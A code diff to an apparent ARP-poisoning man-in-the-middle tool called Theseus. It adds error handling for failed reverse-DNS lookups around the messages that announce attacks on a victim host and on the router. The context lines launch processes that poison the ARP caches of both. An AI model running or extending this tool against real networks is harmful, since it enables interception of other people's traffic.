@@ -100,22 +100,31 @@ class Theseus(object):
 						break
 				except TypeError: pass
 			tm = tm[0]
-			sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
+			try:
+				sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
+			except socket.herror:
+				sys.stdout.write("[\033[1;32m+\033[00m] {} is at {}\n".format(args.target, tm))
 
 			ajobs = []
 			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.interface, tm))
 			ajobs.append(victim_thread)
 			victim_thread.start()
-			vname = socket.gethostbyaddr(args.target)[0]
-			vname = vname.replace('.home', " ")
-			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(vname))
+			try:
+				vname = socket.gethostbyaddr(args.target)[0]
+				vname = vname.replace('.home', " ")
+				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(vname))
+			except socket.herror:
+				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(args.target))
 
 			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.interface, tm))
 			ajobs.append(victim_thread)
 			target_thread.start()
-			rname = socket.gethostbyaddr(router)[0]
-			rname = rname.replace('.home', " ")
-			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))
+			try:
+				rname = socket.gethostbyaddr(router)[0]
+				rname = rname.replace('.home', " ")
+				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))
+			except socket.herror:
+				sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(args.target))
 
 		if bool(cfg.get('Server-Settings', 'Running')) == True:
 			cert = cfg.get('Server-Settings', 'SSl_Certificate')
